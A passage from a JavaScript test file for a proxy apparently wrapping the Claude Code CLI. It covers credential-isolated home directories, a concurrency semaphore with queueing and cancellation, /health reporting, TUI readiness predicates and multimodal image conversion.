  assert.equal(seed.projects["/old/secret"], undefined, "operator project history not carried in");
  assert.ok(hExists(`${tuiHome}/.claude/projects`), "own projects/ dir for transcripts under the same home");
});

console.log("\nresolveTuiHome (env-token credential isolation, PR-D):");
import { resolveTuiHome, DEFAULT_TUI_SCRATCH_HOME } from "./lib/tui/session.mjs";

test("resolveTuiHome: env token set + OCP_TUI_HOME unset → credential-free scratch home", () => {
  const h = resolveTuiHome({ realHome: "/home/u", configuredHome: undefined, envTokenSet: true });
  assert.equal(h, DEFAULT_TUI_SCRATCH_HOME("/home/u"));
  assert.equal(h, "/home/u/.ocp-tui/home");
  assert.notEqual(h, "/home/u", "must NOT be the real home — real home has the shadowing credentials.json");
});

test("resolveTuiHome: env token UNSET → real home (legacy credentials.json path, unchanged)", () => {
  const h = resolveTuiHome({ realHome: "/home/u", configuredHome: undefined, envTokenSet: false });
  assert.equal(h, "/home/u", "no env token → real home, byte-for-byte the pre-fix behaviour");
});

test("resolveTuiHome: explicit OCP_TUI_HOME wins regardless of env token (back-compat)", () => {
  assert.equal(resolveTuiHome({ realHome: "/home/u", configuredHome: "/custom/home", envTokenSet: true }), "/custom/home");
  assert.equal(resolveTuiHome({ realHome: "/home/u", configuredHome: "/custom/home", envTokenSet: false }), "/custom/home");
});

// ── TUI concurrency limiter + drift observability (PR-B: audit C-4 / C-5) ──
import { TuiSemaphore, SemaphoreAbortError, recordTuiEntrypoint, buildTuiHealthBlock } from "./lib/tui/semaphore.mjs";

console.log("\nTUI concurrency limiter (C-4):");

const deferred = () => { let resolve, reject; const p = new Promise((res, rej) => { resolve = res; reject = rej; }); return { p, resolve, reject }; };

await asyncTest("limit=1 serializes two overlapping calls (second waits for the first)", async () => {
  const sem = new TuiSemaphore(1);
  const order = [];
  const g1 = deferred();
  // First task acquires the only slot and blocks on g1.
  const t1 = sem.run(async () => { order.push("t1-start"); await g1.p; order.push("t1-end"); });
  await new Promise((r) => setImmediate(r)); // let t1 acquire
  assert.equal(sem.inflight, 1, "t1 holds the only slot");
  // Second task must QUEUE — it has not started yet.
  const t2 = sem.run(async () => { order.push("t2-start"); });
  await new Promise((r) => setImmediate(r));
  assert.equal(sem.queued, 1, "t2 is queued, not running");
  assert.deepEqual(order, ["t1-start"], "t2 has not started while t1 holds the slot");
  // Release t1 → t2 runs.
  g1.resolve();
  await t1; await t2;
  assert.deepEqual(order, ["t1-start", "t1-end", "t2-start"], "t2 ran only after t1 finished");
  assert.equal(sem.inflight, 0, "all slots released");
  assert.equal(sem.queued, 0, "queue drained");
});

await asyncTest("limit=2 allows two concurrent, queues the third", async () => {
  const sem = new TuiSemaphore(2);
  const g = [deferred(), deferred(), deferred()];
  const started = [];
  const tasks = g.map((d, i) => sem.run(async () => { started.push(i); await d.p; }));
  await new Promise((r) => setImmediate(r));
  assert.equal(sem.inflight, 2, "exactly 2 run concurrently");
  assert.equal(sem.queued, 1, "the third is queued");
  assert.deepEqual(started.sort(), [0, 1], "only the first two started");
  g.forEach((d) => d.resolve());
  await Promise.all(tasks);
  assert.equal(sem.inflight, 0);
});

await asyncTest("slot is RELEASED on throw (finally) — a rejecting task never leaks its slot", async () => {
  const sem = new TuiSemaphore(1);
  await assert.rejects(sem.run(async () => { throw new Error("boom"); }), /boom/);
  assert.equal(sem.inflight, 0, "throwing task released its slot");
  // Prove the slot is reusable: a subsequent task acquires immediately.
  let ran = false;
  await sem.run(async () => { ran = true; });
  assert.equal(ran, true);
  assert.equal(sem.inflight, 0);
});

await asyncTest("wait queue is bounded — run() rejects with tui_queue_full when full (backpressure, not OOM)", async () => {
  const sem = new TuiSemaphore(1, { maxQueue: 1 });
  const g1 = deferred();
  const t1 = sem.run(async () => { await g1.p; });          // holds the slot
  await new Promise((r) => setImmediate(r));
  const t2 = sem.run(async () => {});                        // fills the 1-deep queue
  await new Promise((r) => setImmediate(r));
  assert.equal(sem.queued, 1, "queue is full");
  await assert.rejects(sem.run(async () => {}), /tui_queue_full/, "third request rejects");
  g1.resolve();
  await t1; await t2;
  assert.equal(sem.inflight, 0);
});

console.log("\n-p concurrency wait-queue (FIX ⑥ — same TuiSemaphore reused for the -p path):");

// server.mjs reuses TuiSemaphore as `claudeSemaphore = new TuiSemaphore(MAX_CONCURRENT,
// { maxQueue: CLAUDE_MAX_QUEUE })` and wraps acquire()/release() in acquireClaudeSlot(). These
// tests assert the contract that the 429-mapping depends on: requests beyond the limit QUEUE
// (not reject), only an overflow past the queue rejects (→ HTTP 429 in server.mjs), and a
// released slot is reusable (the #37/#40 slot-leak guard — no leak on normal completion).
await asyncTest("FIX ⑥: requests beyond MAX_CONCURRENT queue, not reject (limit=1, queue=1)", async () => {
  const sem = new TuiSemaphore(1, { maxQueue: 1 });   // mirrors CLAUDE_MAX_CONCURRENT=1, CLAUDE_MAX_QUEUE=1
  const g1 = deferred();
  const inflightP = sem.run(async () => { await g1.p; });   // request 1 — holds the only slot
  await new Promise((r) => setImmediate(r));
  assert.equal(sem.inflight, 1, "req1 inflight");
  const queuedP = sem.run(async () => {});                  // request 2 — WAITS (queued), does NOT reject
  await new Promise((r) => setImmediate(r));
  assert.equal(sem.queued, 1, "req2 queued (waits), not rejected → would be served, not 429");
  // request 3 — queue full → reject (server.mjs maps this single case to 429 + Retry-After)
  await assert.rejects(sem.run(async () => {}), /tui_queue_full|queue/, "req3 overflows → reject (→429)");
  g1.resolve();
  await inflightP; await queuedP;
  assert.equal(sem.inflight, 0, "all slots released after drain (no leak)");
  assert.equal(sem.queued, 0, "queue fully drained");
});

await asyncTest("FIX ⑥: slot released on normal completion is immediately reusable (no #37/#40 leak)", async () => {
  const sem = new TuiSemaphore(1, { maxQueue: 16 });   // mirrors default CLAUDE_MAX_QUEUE=16
  for (let i = 0; i < 5; i++) {
    await sem.run(async () => { /* a normal, completing turn */ });
    assert.equal(sem.inflight, 0, `slot released after turn ${i}`);
  }
  // Prove the limit still binds after many acquire/release cycles.
  const g = deferred();
  const held = sem.run(async () => { await g.p; });
  await new Promise((r) => setImmediate(r));
  assert.equal(sem.inflight, 1, "limit still enforced after reuse cycles");
  g.resolve(); await held;
  assert.equal(sem.inflight, 0);
});

// ── Audit F1 — runtime-lowered/raised limit must actually bite ──────────────
// server.mjs reuses this same TuiSemaphore as `claudeSemaphore`; a PATCH /settings
// maxConcurrent update now calls `claudeSemaphore.setLimit(value)` (see applySettingUpdate's
// "maxConcurrent" case). These tests pin the semaphore-level contract that fix depends on.
console.log("\nF1 — runtime concurrency-limit changes (setLimit / release honoring the current limit):");

await asyncTest("F1: lowering the limit mid-load — release() stops re-granting until inflight drains under the new limit", async () => {
  const sem = new TuiSemaphore(3, { maxQueue: 16 });
  const g = [deferred(), deferred(), deferred()];
  const held = g.map((d) => sem.run(async () => { await d.p; }));
  await new Promise((r) => setImmediate(r));
  assert.equal(sem.inflight, 3, "3 tasks hold the 3 slots");
  // A 4th arrives while at capacity — it queues.
  const g4 = deferred();
  const queued4 = sem.run(async () => { await g4.p; });
  await new Promise((r) => setImmediate(r));
  assert.equal(sem.queued, 1, "4th request queued");

  // Operator lowers maxConcurrent from 3 to 1 while all 3 original slots are still inflight
  // (mirrors a PATCH /settings maxConcurrent=1 hitting server.mjs mid-burst).
  sem.setLimit(1);
  assert.equal(sem.limit, 1);

  // Releasing one of the 3 original holders must NOT hand the freed slot to the queued 4th
  // request — before the F1 fix, release() handed slots off unconditionally, so inflight
  // would have stayed pinned at the OLD higher occupancy forever.
  g[0].resolve();
  await held[0];
  await new Promise((r) => setImmediate(r));
  assert.equal(sem.inflight, 2, "inflight drains toward the new limit, not re-granted");
  assert.equal(sem.queued, 1, "4th request is STILL queued — not over-admitted");

  g[1].resolve();
  await held[1];
  await new Promise((r) => setImmediate(r));
  assert.equal(sem.inflight, 1, "inflight now exactly at the new limit (1)");
  assert.equal(sem.queued, 1, "still queued — inflight(1) is not < limit(1), so no grant yet");

  // Releasing the LAST original holder finally drops inflight under the new limit — only
  // now does the queued 4th request get granted.
  g[2].resolve();
  await held[2];
  await new Promise((r) => setImmediate(r));
  assert.equal(sem.inflight, 1, "queued 4th request now holds the single slot");
  assert.equal(sem.queued, 0, "queue drained");
  g4.resolve();
  await queued4;
  assert.equal(sem.inflight, 0);
});

await asyncTest("F1: raising the limit wakes queued waiters immediately, up to the new headroom", async () => {
  const sem = new TuiSemaphore(1, { maxQueue: 16 });
  const g1 = deferred();
  const t1 = sem.run(async () => { await g1.p; }); // holds the only slot
  await new Promise((r) => setImmediate(r));
  const started = [];
  const g2 = deferred(), g3 = deferred();
  const t2 = sem.run(async () => { started.push(2); await g2.p; });
  const t3 = sem.run(async () => { started.push(3); await g3.p; });
  await new Promise((r) => setImmediate(r));
  assert.equal(sem.queued, 2, "both queue behind the single holder");
  assert.deepEqual(started, [], "neither queued task has started");

  // Operator raises maxConcurrent from 1 to 3 (2 units of new headroom) — BOTH queued
  // waiters must be woken immediately, without waiting for t1 to release.
  sem.setLimit(3);
  await new Promise((r) => setImmediate(r));
  assert.equal(sem.inflight, 3, "t1 + both newly-woken waiters now hold slots");
  assert.equal(sem.queued, 0, "queue drained by the limit raise");
  assert.deepEqual(started.sort(), [2, 3], "both queued tasks started without waiting for t1's release");

  g1.resolve(); g2.resolve(); g3.resolve();
  await Promise.all([t1, t2, t3]);
  assert.equal(sem.inflight, 0);
});

await asyncTest("F1: raising the limit wakes only as many waiters as the new headroom allows (FIFO)", async () => {
  const sem = new TuiSemaphore(1, { maxQueue: 16 });
  const g1 = deferred();
  const t1 = sem.run(async () => { await g1.p; });
  await new Promise((r) => setImmediate(r));
  const started = [];
  const g2 = deferred(), g3 = deferred();
  const t2 = sem.run(async () => { started.push(2); await g2.p; });
  const t3 = sem.run(async () => { started.push(3); await g3.p; });
  await new Promise((r) => setImmediate(r));
  assert.equal(sem.queued, 2);

  sem.setLimit(2); // only 1 unit of new headroom (1 -> 2) — exactly one queued waiter wakes
  await new Promise((r) => setImmediate(r));
  assert.equal(sem.inflight, 2);
  assert.equal(sem.queued, 1, "one waiter still queued — only one slot of headroom existed");
  assert.deepEqual(started, [2], "FIFO: the earlier-queued waiter (t2) wakes, not t3");

  // Freeing t1's slot afterward still honors the (now current) limit of 2 via release()'s
  // normal path — the still-queued t3 gets in once a slot actually frees.
  g1.resolve();
  await t1;
  await new Promise((r) => setImmediate(r));
  assert.deepEqual(started, [2, 3], "t3 granted once a slot frees, honoring the raised limit");
  assert.equal(sem.queued, 0);

  g2.resolve(); g3.resolve();
  await t2; await t3;
  assert.equal(sem.inflight, 0);
});

// ── Audit F2 — queued waiters must be cancellable on client disconnect ──────
// server.mjs wires an AbortSignal derived from the client's res "close" event into
// claudeSemaphore.acquire()/tuiSemaphore.acquire() (see closeSignalFor + acquireClaudeSlot /
// callClaudeTui). These tests pin the semaphore-level cancellation contract that depends on.
console.log("\nF2 — queued-wait cancellation via AbortSignal (client disconnect while queued):");

await asyncTest("F2: aborting a QUEUED waiter rejects with SemaphoreAbortError and SPLICES it out (queued drops immediately, not just flagged)", async () => {
  const sem = new TuiSemaphore(1, { maxQueue: 16 });
  const g1 = deferred();
  const t1 = sem.run(async () => { await g1.p; }); // holds the only slot
  await new Promise((r) => setImmediate(r));
  const controller = new AbortController();
  const acquire2 = sem.acquire(controller.signal); // queues behind t1
  await new Promise((r) => setImmediate(r));
  assert.equal(sem.queued, 1, "second acquire queued");

  controller.abort(); // simulates the client disconnecting while still queued
  await assert.rejects(acquire2, SemaphoreAbortError, "cancelled waiter rejects with SemaphoreAbortError");
  assert.equal(sem.queued, 0, "cancelled waiter is REMOVED — queue length drops immediately");
  assert.equal(sem.inflight, 1, "t1's slot is untouched by the cancellation");

  // Prove the cancelled waiter never later acquires a slot: free t1's slot and confirm
  // nobody is waiting to receive it (the queue is genuinely empty, not just decremented).
  g1.resolve();
  await t1;
  assert.equal(sem.inflight, 0, "slot freed with nobody queued — the cancelled waiter never got it");
});

await asyncTest("F2: an already-aborted signal rejects acquire() immediately, never touching the wait queue", async () => {
  const sem = new TuiSemaphore(1, { maxQueue: 16 });
  const g1 = deferred();
  const t1 = sem.run(async () => { await g1.p; }); // holds the only slot
  await new Promise((r) => setImmediate(r));

  const controller = new AbortController();
  controller.abort(); // client already gone before this request ever tries to acquire
  await assert.rejects(sem.acquire(controller.signal), SemaphoreAbortError);
  assert.equal(sem.queued, 0, "never entered the wait queue at all");

  g1.resolve(); await t1;
});

await asyncTest("F2: cancelling one queued waiter preserves FIFO order for the others", async () => {
  const sem = new TuiSemaphore(1, { maxQueue: 16 });
  const g1 = deferred();
  const t1 = sem.run(async () => { await g1.p; });
  await new Promise((r) => setImmediate(r));

  const started = [];
  const cA = new AbortController();
  const cB = new AbortController();
  const accA = sem.acquire(cA.signal).then(() => started.push("A"));
  const accB = sem.acquire(cB.signal).then(() => started.push("B"));
  const g3 = deferred();
  const t3 = sem.run(async () => { started.push("C"); await g3.p; });
  await new Promise((r) => setImmediate(r));
  assert.equal(sem.queued, 3, "A, B, C all queued behind t1");

  cB.abort(); // B (the middle waiter) disconnects
  await assert.rejects(accB, SemaphoreAbortError);
  assert.equal(sem.queued, 2, "B removed; A and C remain, in original relative order");

  g1.resolve();
  await t1;
  await new Promise((r) => setImmediate(r));
  assert.deepEqual(started, ["A"], "A (queued first, still present) is granted next — FIFO preserved after B's removal");
  assert.equal(sem.inflight, 1);
  assert.equal(sem.queued, 1, "C still waiting");

  sem.release(); // A was acquired directly (not via run()) — free its slot manually
  await new Promise((r) => setImmediate(r));
  assert.deepEqual(started, ["A", "C"], "C granted next");
  g3.resolve();
  await t3;
  assert.equal(sem.inflight, 0);
});

await asyncTest("F2/L2: abort AFTER grant is a no-op — waiter keeps its slot, no rejection, slot released exactly once", async () => {
  const sem = new TuiSemaphore(1, { maxQueue: 16 });
  const g1 = deferred();
  const t1 = sem.run(async () => { await g1.p; }); // holds the only slot
  await new Promise((r) => setImmediate(r));

  const controller = new AbortController();
  let granted = false;
  const acq = sem.acquire(controller.signal).then(() => { granted = true; });
  await new Promise((r) => setImmediate(r));
  assert.equal(sem.queued, 1, "waiter queued behind t1");

  // t1 finishes → release() shifts the waiter out and grants it the slot (waiter() detaches
  // the abort listener before resolving).
  g1.resolve();
  await t1;
  await acq;
  assert.equal(granted, true, "waiter was granted the slot");
  assert.equal(sem.inflight, 1, "granted waiter holds the slot");
  assert.equal(sem.queued, 0);

  // The client disconnects AFTER the grant — the abort-after-grant race. onAbort must be a
  // no-op (the waiter is no longer in _waiters; idx===-1 guard): no rejection materializes,
  // the queue is untouched, and the slot is still owned by the (already-resolved) acquirer.
  controller.abort();
  await new Promise((r) => setImmediate(r));
  assert.equal(sem.inflight, 1, "abort after grant did NOT revoke or double-free the slot");
  assert.equal(sem.queued, 0, "abort after grant did not corrupt queue accounting");

  // The slot is released exactly once via the normal path and is immediately reusable.
  sem.release();
  assert.equal(sem.inflight, 0, "slot released exactly once via the normal path");
  await sem.run(async () => {}); // prove the semaphore is fully healthy afterward
  assert.equal(sem.inflight, 0);
});

console.log("\nTUI drift observability (C-5):");

test("recordTuiEntrypoint: observed 'cli' is NOT a mismatch and sets lastEntrypoint", () => {
  const ts = { lastEntrypoint: null, entrypointMismatches: 0 };
  const mism = recordTuiEntrypoint(ts, "cli", "cli");
  assert.equal(mism, false);
  assert.equal(ts.lastEntrypoint, "cli");
  assert.equal(ts.entrypointMismatches, 0);
});

test("recordTuiEntrypoint: expected cli but observed 'sdk-cli' increments the mismatch counter (drift)", () => {
  const ts = { lastEntrypoint: null, entrypointMismatches: 0 };
  assert.equal(recordTuiEntrypoint(ts, "sdk-cli", "cli"), true);
  assert.equal(ts.lastEntrypoint, "sdk-cli");
  assert.equal(ts.entrypointMismatches, 1);
  // A second drift increments again (counter accumulates across turns).
  assert.equal(recordTuiEntrypoint(ts, "sdk-cli", "cli"), true);
  assert.equal(ts.entrypointMismatches, 2);
});

test("recordTuiEntrypoint: null observation → lastEntrypoint null, counts as mismatch when expected cli", () => {
  const ts = { lastEntrypoint: "cli", entrypointMismatches: 0 };
  assert.equal(recordTuiEntrypoint(ts, null, "cli"), true);
  assert.equal(ts.lastEntrypoint, null);
  assert.equal(ts.entrypointMismatches, 1);
});

test("recordTuiEntrypoint: non-cli expected mode (auto) never counts a mismatch", () => {
  const ts = { lastEntrypoint: null, entrypointMismatches: 0 };
  assert.equal(recordTuiEntrypoint(ts, "sdk-cli", "auto"), false);
  assert.equal(ts.lastEntrypoint, "sdk-cli");
  assert.equal(ts.entrypointMismatches, 0);
});

test("buildTuiHealthBlock: shape + live counters (the additive /health tui block)", () => {
  const sem = new TuiSemaphore(2);
  const ts = { lastEntrypoint: "cli", entrypointMismatches: 3 };
  const block = buildTuiHealthBlock(
    { enabled: true, entrypointMode: "cli", maxConcurrent: 2 }, ts, sem);
  // Shape is ADDITIVE-only: the seven original keys must all still be present (existing
  // /health consumers are grandfathered, ADR 0006), plus `pool` (warm pane pool) and the
  // stream* fields (backlog #2). Asserting CONTAINMENT plus an exact added-set — rather than
  // one flat deepEqual — is what makes "additive" itself the thing under test: a future field
  // that silently REPLACED an original key would pass a flat equality check that was updated
  // alongside it, but cannot pass this one.
  const ORIGINAL_KEYS = ["enabled", "entrypointMismatches", "entrypointMode", "inflight", "lastEntrypoint", "maxConcurrent", "queued"];
  const keys = Object.keys(block);
  for (const k of ORIGINAL_KEYS) assert.ok(keys.includes(k), `original /health key must survive: ${k}`);
  assert.deepEqual(keys.filter((k) => !ORIGINAL_KEYS.includes(k)).sort(),
    ["pool", "streamDeltas", "streamDivergences", "streamEnabled", "streamTopUps", "streamTurns", "streamZeroDeltaTurns"],
    "only the documented pool + streaming fields may be added");
  assert.equal(block.pool, null, "no pool passed → null (the default, pool disabled)");
  assert.equal(block.enabled, true);
  assert.equal(block.entrypointMode, "cli");
  assert.equal(block.lastEntrypoint, "cli");
  assert.equal(block.entrypointMismatches, 3);
  assert.equal(block.inflight, 0);
  assert.equal(block.queued, 0);
  assert.equal(block.maxConcurrent, 2);
});

test("buildTuiHealthBlock: TUI off → enabled:false but block still present (stable shape)", () => {
  const sem = new TuiSemaphore(2);
  const ts = { lastEntrypoint: null, entrypointMismatches: 0 };
  const block = buildTuiHealthBlock(
    { enabled: false, entrypointMode: "cli", maxConcurrent: 2 }, ts, sem);
  assert.equal(block.enabled, false);
  assert.equal(block.lastEntrypoint, null);
  assert.equal(block.entrypointMismatches, 0);
});

await asyncTest("buildTuiHealthBlock reflects live inflight/queued while turns are in flight", async () => {
  const sem = new TuiSemaphore(1);
  const ts = { lastEntrypoint: null, entrypointMismatches: 0 };
  const g1 = deferred();
  const t1 = sem.run(async () => { await g1.p; });
  const t2 = sem.run(async () => {}); // queued behind t1
  await new Promise((r) => setImmediate(r));
  const block = buildTuiHealthBlock({ enabled: true, entrypointMode: "cli", maxConcurrent: 1 }, ts, sem);
  assert.equal(block.inflight, 1, "one turn in flight");
  assert.equal(block.queued, 1, "one turn queued");
  g1.resolve();
  await t1; await t2;
});

// ── TUI session driver: runTuiTurn (live-only, guarded) ──────────────────
console.log("\nTUI session driver:");

if (process.env.OCP_TUI_LIVE === "1") {
  await asyncTest("runTuiTurn drives a real interactive turn and returns text", async () => {
    const { runTuiTurn } = await import("./lib/tui/session.mjs");
    const out = await runTuiTurn({
      prompt: "Reply with exactly the word PONG and nothing else.",
      model: "claude-haiku-4-5-20251001",
      claudeBin: process.env.OCP_TUI_CLAUDE_BIN || "claude",
      home: process.env.HOME,
      cwd: `${process.env.HOME}/.ocp-tui/work`,
      wallclockMs: 120000,
    });
    assert.ok(/PONG/i.test(out.text), `expected PONG, got: ${out.text.slice(0, 200)}`);
  });
} else {
  test("runTuiTurn (live) — SKIPPED (set OCP_TUI_LIVE=1 on PI231 to run)", () => {
    assert.ok(true);
  });
}

// ── TUI readiness / paste-verify predicates (issue #130) ────────────────────
// Replicates tuiInputReady, tuiPromptLanded verbatim from lib/tui/session.mjs.
// Keep in sync with the definitions there.
function _tuiInputReady(pane) {
  return /\? for shortcuts|shift\+tab to cycle/.test(pane);
}
function _tuiPromptLanded(pane, prompt) {
  const flatPane = pane.replace(/\s+/g, " ");
  if (flatPane.includes("[Pasted text")) return true;
  const firstLine = String(prompt).split("\n").map(s => s.trim()).find(Boolean) || "";
  const needle = firstLine.replace(/\s+/g, " ").slice(0, 24);
  return needle.length >= 2 && flatPane.includes(needle); // C-4 (#133): 3 → 2 (see lib/tui/session.mjs)
}

// Real captured pane samples (empirically confirmed via live capture-pane on PI231,
// claude v2.1.114 and v2.1.159). Source: issue #130 spec.
const TUI_READY_PANE = `❯ Try "how does <filepath> work?"
  ? for shortcuts · ← for agents`;

const TUI_LANDED_PANE = `❯ Reply with exactly: PONG_TEST
  ? for shortcuts · ← for agents`;

// Newer claude 2.1.x renders the input bar with a `shift+tab to cycle` footer instead of
// `? for shortcuts` — the matcher must accept it too, or the pane reads as never-ready.
const TUI_READY_PANE_SHIFT_TAB = `❯ Try "how does <filepath> work?"
  ⏵⏵ bypass permissions on (shift+tab to cycle)`;

// Welcome splash shown before input bar is rendered — neither ready-state footer.
const TUI_BOOT_PANE = `╭─ Claude Code v2.1.114 ─ Welcome back Tao! ─╮\n│ Tips for getting started │`;

console.log("\nTUI readiness + paste-verify predicates (issue #130):");

test("tuiInputReady(READY_PANE) === true  (input bar rendered)", () => {
  assert.equal(_tuiInputReady(TUI_READY_PANE), true);
});
test("tuiInputReady(LANDED_PANE) === true  (input bar still present after paste)", () => {
  assert.equal(_tuiInputReady(TUI_LANDED_PANE), true);
});
test("tuiInputReady(READY_PANE_SHIFT_TAB) === true  (newer claude `shift+tab to cycle` footer)", () => {
  assert.equal(_tuiInputReady(TUI_READY_PANE_SHIFT_TAB), true);
});
test("tuiInputReady(BOOT_PANE) === false  (welcome splash, no input bar yet)", () => {
  assert.equal(_tuiInputReady(TUI_BOOT_PANE), false);
});

test("tuiPromptLanded(READY_PANE, 'Reply with exactly: PONG_TEST') === false  (still placeholder)", () => {
  assert.equal(_tuiPromptLanded(TUI_READY_PANE, "Reply with exactly: PONG_TEST"), false);
});
test("tuiPromptLanded(LANDED_PANE, 'Reply with exactly: PONG_TEST') === true  (prompt prefix visible)", () => {
  assert.equal(_tuiPromptLanded(TUI_LANDED_PANE, "Reply with exactly: PONG_TEST"), true);
});
test("tuiPromptLanded(READY_PANE, 'ping') === false  (prompt text absent from placeholder pane)", () => {
  assert.equal(_tuiPromptLanded(TUI_READY_PANE, "ping"), false);
});
test("tuiPromptLanded('❯ ping\\n  ? for shortcuts', 'ping') === true  (needle present, no placeholder)", () => {
  assert.equal(_tuiPromptLanded("❯ ping\n  ? for shortcuts", "ping"), true);
});
// C-4 (#133): short prompts (1–2 char first line) MUST be able to land. Threshold
// lowered 3 → 2. A 2-char prompt ("hi") present in the pane now lands instead of
// 5s-failing with tui_paste_not_landed every time (live-reproduced: "hi").
test("tuiPromptLanded('❯ hi\\n  ? for shortcuts', 'hi') === true  (2-char prompt lands — C-4)", () => {
  assert.equal(_tuiPromptLanded("❯ hi\n  ? for shortcuts", "hi"), true);
});
// False-positive guard for the lowered threshold: a 2-char needle ABSENT from the
// still-empty placeholder pane must NOT land (no spurious Enter into an empty box).
test("tuiPromptLanded(READY_PANE, 'hi') === false  (2-char prompt not yet visible — no false positive)", () => {
  assert.equal(_tuiPromptLanded(TUI_READY_PANE, "hi"), false);
});
// issue #130 root cause: a big bracketed paste shows "[Pasted text #N +M lines]" — must be landed.
test("tuiPromptLanded(bracketed-paste pane, big prompt) === true", () => {
  assert.equal(_tuiPromptLanded("❯ [Pasted text #1 +301 lines]\n  ? for shortcuts", "[System] Context 0."), true);
});
// issue #130 false-positive guard: the EMPTY placeholder uses a CURLY quote (“) and randomized
// example text — the old placeholder-gone heuristic wrongly reported landed=true here, so Enter
// fired into an empty box. Must be FALSE (no positive signal: not [Pasted text], prompt not shown).
test("tuiPromptLanded(curly-quote placeholder, big prompt) === false  (no false-positive)", () => {
  assert.equal(_tuiPromptLanded("❯ Try “how do I log an error?”\n  ? for shortcuts", "[System] Context 0."), false);
});

// ── /health anonymousKey gate (issue #109) ──────────────────────────────────
// MIRRORS the predicate in server.mjs (search ADVERTISE_ANON_KEY) — copied
// verbatim to avoid importing server.mjs (top-level server.listen() would
// start a live HTTP server, per the stream-JSON parser tests convention above).
console.log("\n/health anonymousKey gate (issue #109):");

// Replicate the gating predicate from server.mjs line ~286/1927:
//   ...((isLocalhost || ADVERTISE_ANON_KEY) ? { anonymousKey: ... } : {})
function shouldAdvertiseAnonKey(isLocalhost, advertise) { return isLocalhost || advertise; }

test("(localhost=false, flag=false) → omit key", () => {
  assert.equal(shouldAdvertiseAnonKey(false, false), false);
});
test("(localhost=true, flag=false) → include key (localhost always exempt)", () => {
  assert.equal(shouldAdvertiseAnonKey(true, false), true);
});
test("(localhost=false, flag=true) → include key (opt-in set)", () => {
  assert.equal(shouldAdvertiseAnonKey(false, true), true);
});
test("(localhost=true, flag=true) → include key (both true)", () => {
  assert.equal(shouldAdvertiseAnonKey(true, true), true);
});

// ── contentToText helper tests (issue #110) ──────────────────────────────────
// MIRRORS server.mjs contentToText — copied verbatim to avoid importing server.mjs
// (top-level server.listen() would start a live HTTP server).
// Keep in sync with the definition in server.mjs above messagesToPrompt.
console.log("\ncontentToText helper (issue #110):");

function contentToText(content) {
  if (typeof content === "string") return content;
  if (Array.isArray(content)) {
    return content.map(p =>
      p && p.type === "text" && typeof p.text === "string" ? p.text : "[non-text content omitted]"
    ).join("");
  }
  return content == null ? "" : JSON.stringify(content);
}

test("contentToText: string input returned unchanged", () => {
  assert.equal(contentToText("hello"), "hello");
});

test("contentToText: array of text parts concatenated", () => {
  assert.equal(
    contentToText([{ type: "text", text: "hello" }, { type: "text", text: " world" }]),
    "hello world"
  );
});

test("contentToText: non-text part (image_url) replaced with placeholder", () => {
  assert.equal(
    contentToText([{ type: "image_url", image_url: { url: "https://example.com/img.png" } }]),
    "[non-text content omitted]"
  );
});

test("contentToText: empty array returns empty string", () => {
  assert.equal(contentToText([]), "");
});

test("contentToText: null returns empty string", () => {
  assert.equal(contentToText(null), "");
});

// ── multimodal image transform (issue #110) ──────────────────────────────────
// OpenAI image_url parts → Anthropic image blocks for `claude -p --input-format
// stream-json`. lib/multimodal.mjs is a PURE module (no server.listen()), so it is
// imported directly here. Class B.1: shape per OpenAI vision spec, authorized by
// ADR 0006. Mechanism verified live: a base64 PNG fed as an Anthropic image block
// via --input-format stream-json is correctly described by the model.
import {
  hasImageContent as mmHasImageContent,
  buildImageBlocks as mmBuildImageBlocks,
  buildStreamJsonInput as mmBuildStreamJsonInput,
  MultimodalError as MmError,
  SUPPORTED_IMAGE_TYPES as MM_SUPPORTED,
} from "./lib/multimodal.mjs";
import { parsePositiveInt } from "./lib/env.mjs";

console.log("\nmultimodal image transform (issue #110):");

// A short, valid base64 string (charset-valid; not decoded by the transform).
const MM_B64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAAAAAA6fptVAAAACklEQVR4nGP4DwABAQEAG7buVgAAAABJRU5ErkJggg==";
const dataUri = (mt = "image/png") => `data:${mt};base64,${MM_B64}`;
const imgPart = (mt) => ({ type: "image_url", image_url: { url: dataUri(mt) } });
const txtPart = (t) => ({ type: "text", text: t });

test("hasImageContent: plain string message → false (text path preserved)", () => {
  assert.equal(mmHasImageContent([{ role: "user", content: "hello" }]), false);
});

test("hasImageContent: array of text-only parts → false", () => {
  assert.equal(mmHasImageContent([{ role: "user", content: [txtPart("a"), txtPart("b")] }]), false);
});

test("hasImageContent: message with an image_url part → true", () => {
  assert.equal(mmHasImageContent([{ role: "user", content: [txtPart("q"), imgPart()] }]), true);
});

test("hasImageContent: image anywhere in history (not just last) → true", () => {
  const msgs = [
    { role: "user", content: [txtPart("look"), imgPart()] },
    { role: "assistant", content: "ok" },
    { role: "user", content: "and now?" },
  ];
  assert.equal(mmHasImageContent(msgs), true);
});

// ── PR #154 review round 2, gap (b): image ONLY in a system message must not silently drop ──
// The handler detects multimodal on the FULL list but extraction/spawn filter system messages out.
// The guard fires exactly when the full list has an image but the non-system list does not — proven
// here against the same predicate the guard uses, so a system-only image is rejected (400) rather
// than falling to the text path and returning a 200 hallucinated answer.
test("hasImageContent: image ONLY in a system message → true on full list, false after system filter (guard fires)", () => {
  const msgs = [
    { role: "system", content: [txtPart("context"), imgPart()] },
    { role: "user", content: "describe it" },
  ];
  assert.equal(mmHasImageContent(msgs), true, "detected as multimodal on the full list");
  assert.equal(mmHasImageContent(msgs.filter(m => m.role !== "system")), false, "no image survives the system filter → guard must 400");
});
test("hasImageContent: image in a USER message survives the system filter (legitimate request not rejected)", () => {
  const msgs = [
    { role: "system", content: "you are helpful" },
    { role: "user", content: [txtPart("describe it"), imgPart()] },
  ];
  assert.equal(mmHasImageContent(msgs.filter(m => m.role !== "system")), true, "user image survives → normal multimodal path");
});

test("buildImageBlocks: data-URI parsed into an Anthropic base64 image block", () => {
  const { blocks, stats } = mmBuildImageBlocks([{ role: "user", content: [txtPart("what is this?"), imgPart("image/png")] }]);
  assert.equal(blocks.length, 2);
  assert.equal(blocks[0].type, "text");
  assert.equal(blocks[0].text, "what is this?");
  assert.deepEqual(blocks[1], { type: "image", source: { type: "base64", media_type: "image/png", data: MM_B64 } });
  assert.equal(stats.imageCount, 1);
  assert.ok(stats.totalImageBytes > 0);
});

test("buildImageBlocks: media_type carried through (jpeg/gif/webp)", () => {
  for (const mt of ["image/jpeg", "image/gif", "image/webp"]) {
    const { blocks } = mmBuildImageBlocks([{ role: "user", content: [imgPart(mt)] }]);
    assert.equal(blocks.find(b => b.type === "image").source.media_type, mt);
  }
});

